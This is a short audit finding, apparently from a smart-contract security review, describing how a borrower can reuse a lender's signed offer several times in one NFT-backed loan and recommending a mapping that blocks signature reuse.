# Lenders signature reusage in the same Loan

## Summary
Borrower can use the same Offer (or offchain signature being more technical) for **one** Loan multiple times using more offer.amount than expected by lender. 

## Vulnerability Detail
Lenders/suppliers can have many active Offers so they should have enough allowance for all of them. But also they may want to cover only certain amount/share of a Loan for some NFT (for risk management or whatever). But signature reuse could end in an undesirable situation where lenders covers more amount/share of a Loan of a NFT than desired.

## Impact
Lenders can't handle their risk management by setting an amount in the Offer they sign if they want to have multiple active offers. The only way to handle it would be with their allowance but this collides with having multiple active offers as the allowance must be enough for the sum of all of them.

## Recommendation
Use a mapping to avoid signatures reusage so Lenders can trust in what they sign.
